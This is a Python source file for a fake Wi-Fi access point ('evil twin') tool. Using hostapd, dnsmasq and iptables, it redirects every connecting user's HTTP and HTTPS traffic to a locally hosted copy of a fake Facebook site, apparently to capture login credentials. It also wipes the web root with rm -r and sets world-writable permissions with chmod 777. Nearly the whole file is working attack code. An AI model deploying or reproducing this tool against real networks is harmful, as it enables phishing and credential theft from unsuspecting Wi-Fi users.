from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap, Dot11Deauth
from colorama import Fore
from string import Template
import run

class fakeAP: 

    fake_ap_interface = "none"
    fake_ssid = "fake"
    sniffer = "none"

    def __init__(self, fake_ap_interface, fake_ssid, sniffer) -> None:
        
        self.fake_ap_interface = fake_ap_interface
        self.fake_ssid = fake_ssid
        self.sniffer = sniffer

        # Remove the build directory
        os.system('rm -rf build/')
        # Copy the Templates directory to a new build directory
        os.system('cp -r Templates build')


        # Clear port 53
        os.system('systemctl disable systemd-resolved.service >/dev/null 2>&1')
        os.system('systemctl stop systemd-resolved>/dev/null 2>&1')


        # Modify the hostapd.conf file with the access point interface and network name
        with open('build/hostapd.conf', 'r+') as f:
            template = Template(f.read())
            f.seek(0)
            f.write(template.substitute(INTERFACE=self.fake_ap_interface, NETWORK=self.fake_ssid))
            f.truncate()
        # Modify the dnsmasq.conf file with the access point interface
        with open('build/dnsmasq.conf', 'r+') as f:
            template = Template(f.read())
            f.seek(0)
            f.write(template.substitute(INTERFACE=self.fake_ap_interface))
            f.truncate()
        # Modify the prepareAP.sh file with the access point interface
        with open('build/prepareAP.sh', 'r+') as f:
            template = Template(f.read())
            f.seek(0)
            f.write(template.substitute(INTERFACE=self.fake_ap_interface))
            f.truncate()
        # Modify the cleanup.sh file with the sniffer and access point interfaces
        with open('build/cleanup.sh', 'r+') as f:
            template = Template(f.read())
            f.seek(0)
            f.write(template.substitute(SNIFFER=self.sniffer, AP=self.fake_ap_interface))
            f.truncate()
        

        # AP with address 10.0.0.1 on the given interface
        os.system(f"ifconfig {fake_ap_interface} up 10.0.0.1 netmask 255.255.255.0")
        print(Fore.YELLOW + "[-->] setting {} with ip 10.0.0.1 netmask 255.255.255.0".format(self.fake_ap_interface))

        # Clear all IP Rules
        os.system('iptables --flush')
        os.system('iptables --table nat --flush')
        os.system('iptables --delete-chain')
        os.system('iptables --table nat --delete-chain')
        print(Fore.YELLOW + "[-->] Clearing all IP Rules")

        # Redirect any request to the captive portal
        os.system(f'iptables -t nat -A PREROUTING  -i usb0 -p tcp --dport 80 -j DNAT  --to-destination 10.0.0.1:80')
        os.system(f'iptables -t nat -A PREROUTING  -i usb0 -p tcp --dport 443 -j DNAT  --to-destination 10.0.0.1:80')
        print(Fore.YELLOW + "[-->] Redirecting any request to the captive portal")

        # Enable internet access use the usb0 interface
        os.system(f'iptables -A FORWARD --in-interface {fake_ap_interface} -j ACCEPT')
        os.system(f'iptables -t nat -A POSTROUTING --out-interface usb0 -j MASQUERADE')
        print(Fore.YELLOW + "[-->] Enableing internet access")

        # Initial wifi interface configuration (seems to fix problems)
        os.system(f'ip link set {fake_ap_interface} down')
        os.system(f'ip addr flush dev {fake_ap_interface}')
        os.system(f'ip link set {fake_ap_interface} up')
        os.system(f'ip addr add 10.0.0.1/10 dev {fake_ap_interface}')

        # Enable IP forwarding from one interface to another
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
        os.system(f'sleep 3')
        print(Fore.YELLOW + "[-->] Enable IP forwarding from one interface to another")

        cmd = "sudo dnsmasq -C build/dnsmasq.conf"
        p = subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid)

        os.system(f'route add default gw 10.0.0.1') 

        self.start_apache()
        
        os.system("hostapd build/hostapd.conf -B >/dev/null 2>&1")
        
        print(Fore.GREEN + '[+] The Fake Access Point is now available using Name : {} '.format(fake_ssid))

        # listen_thread = Thread(target=start_listen, daemon=True)
        # listen_thread.start()
        while True:
            user_input = input(Fore.YELLOW + '[*] to turn off the Access Point Please press \"done\"\n\n')
            if user_input == 'done':
                run.exit_and_cleanup(0, 'Done! , thanks for using')
            else:
                print(Fore.RED + 'invalid option...')



    def start_apache(self):
        os.system('sudo rm -r /var/www/html/* 2>/dev/null')  # delete all folders and files in this directory
        os.system('sudo cp -r fake-facebook-website/* /var/www/html')
        os.system('sudo chmod 777 /var/www/html/*')
        os.system('sudo chmod 777 /var/www/html')

        # update rules inside 000-default.conf of apache2
        os.system('sudo cp -f 000-default.conf /etc/apache2/sites-enabled')
        os.system('a2enmod rewrite >/dev/null 2>&1')  # enable the mod_rewrite in apache
        os.system('service apache2 restart >/dev/null 2>&1')     # reload and restart apache2

        print(Fore.YELLOW + '\n[*] appache server start successfully')
        time.sleep(1)